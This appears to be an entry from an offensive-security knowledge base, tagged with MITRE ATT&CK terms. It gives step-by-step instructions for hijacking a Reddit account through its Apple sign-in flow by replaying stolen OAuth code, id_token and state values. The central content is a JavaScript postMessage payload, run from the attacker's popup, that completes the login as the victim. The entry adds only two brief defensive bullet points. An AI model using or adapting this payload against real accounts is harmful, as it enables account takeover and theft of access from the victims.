---
tags:
  - account-hijack
  - token-use
type: procedure
tools:
  - '[[tools/Chrome-Browser]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/postmessage-oauthdone]]'
platforms:
  - Web
techniques:
  - '[[Application Access Token]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: ee6b9068-2df0-486c-9f73-21848dc31050
created_at: '2025-12-14T00:11:25.327Z'
updated_at: '2025-12-14T00:11:25.327Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Application Access Token]]'
---
# Hijack Account with Stolen Tokens

## Summary

This procedure uses stolen OAuth code and state to post a message completing the login as the victim, achieving full account takeover.

## Description

From the attacker's popup, a postMessage is sent to Reddit with the victim's tokens, bypassing normal authentication.

## Requirements

1. Stolen code, id_token, and state
2. Attacker's Apple popup open
3. Access to Reddit in browser

## Defense

Defensive measures and detection strategies:

- Validate OAuth state strictly
- Monitor for anomalous logins

## Objectives

1. Complete login with stolen tokens
2. Gain full account access
3. Achieve hijack

## Instructions

### Step 1: Post Message with Tokens

**Context**: Use console in attacker's popup to send tokens.

Execute [[commands/postmessage-oauthdone]]:

```javascript
opener.postMessage('{"method":"oauthDone","data":{"authorization":{"code":"[stolen_code]","id_token":"[stolen_id_token]","state":"[attacker_state]"}}}',"*");
```

> This completes the login as the victim.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Application Access Token]]

### Sub-Techniques



## Commands Used

- [[commands/postmessage-oauthdone]]

## Tools Used

- [[tools/Chrome-Browser]]

## Tags

- account-hijack
- token-use
